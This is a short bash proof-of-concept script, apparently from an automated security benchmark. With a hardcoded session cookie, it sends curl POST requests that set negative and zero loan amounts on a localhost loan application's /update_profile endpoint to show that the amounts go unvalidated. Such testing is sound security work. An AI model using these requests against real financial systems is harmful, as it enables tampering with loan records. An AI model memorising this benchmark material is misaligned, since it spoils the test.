#!/bin/bash
# POC: Demonstrates POST /update_profile endpoint accepting invalid negative and zero loan amounts without validation
# Target: ./repo
# Created: 2025-11-07T16:06:45.388Z
# Session: benchmark-XBEN-022-24-mhp1ee6o

# POC for Business Logic Flaw - Negative and Zero Loan Amount Manipulation
# Demonstrates that POST /update_profile accepts invalid loan amounts

TARGET_URL="http://localhost/update_profile"
SESSION_COOKIE="session=eyJ1c2VyX2lkIjoxfQ.aQ4YkA.lgLvgKVY8rtWUW99eOPGiw6Ot28"

echo "=========================================="
echo "POC: Negative and Zero Loan Amount Manipulation"
echo "=========================================="
echo ""

# Test 1: Set loan_amount to negative value
echo "[*] Test 1: Setting loan_amount to negative value (-1000)"
RESPONSE_NEGATIVE=$(curl -s -b "$SESSION_COOKIE" -X POST "$TARGET_URL" \
  -d "name=test&lastname=user&email=test@example.com&loan_amount=-1000&loan_term_months=60&monthly_payment=212")

if echo "$RESPONSE_NEGATIVE" | grep -q 'value="-1000'; then
  echo "[✓] SUCCESS: Negative loan amount (-1000) was accepted!"
  echo "    Response contains: value=\"-1000"
  echo ""
else
  echo "[✗] FAILED: Negative loan amount was not accepted"
  echo "    Full response: $RESPONSE_NEGATIVE"
  echo ""
fi

# Test 2: Set loan_amount to zero
echo "[*] Test 2: Setting loan_amount to zero (0)"
RESPONSE_ZERO=$(curl -s -b "$SESSION_COOKIE" -X POST "$TARGET_URL" \
  -d "name=test&lastname=user&email=test@example.com&loan_amount=0&loan_term_months=60&monthly_payment=212")

if echo "$RESPONSE_ZERO" | grep -q 'value="0'; then
  echo "[✓] SUCCESS: Zero loan amount (0) was accepted!"
  echo "    Response contains: value=\"0"
  echo ""
else
  echo "[✗] FAILED: Zero loan amount was not accepted"
  echo "    Full response: $RESPONSE_ZERO"
  echo ""
fi

# Test 3: Set loan_amount to very large negative value
echo "[*] Test 3: Setting loan_amount to very large negative value (-999999)"
RESPONSE_LARGE_NEG=$(curl -s -b "$SESSION_COOKIE" -X POST "$TARGET_URL" \
  -d "name=test&lastname=user&email=test@example.com&loan_amount=-999999&loan_term_months=60&monthly_payment=212")

if echo "$RESPONSE_LARGE_NEG" | grep -q 'value="-999999'; then
  echo "[✓] SUCCESS: Large negative loan amount (-999999) was accepted!"
  echo "    Response contains: value=\"-999999"
  echo ""
else
  echo "[✗] FAILED: Large negative loan amount was not accepted"
  echo "    Full response: $RESPONSE_LARGE_NEG"
  echo ""
fi

echo "=========================================="
echo "POC Summary:"
echo "=========================================="
echo "The endpoint accepts invalid loan amounts without proper validation."
echo "Negative and zero values should not be permitted in financial calculations."
echo ""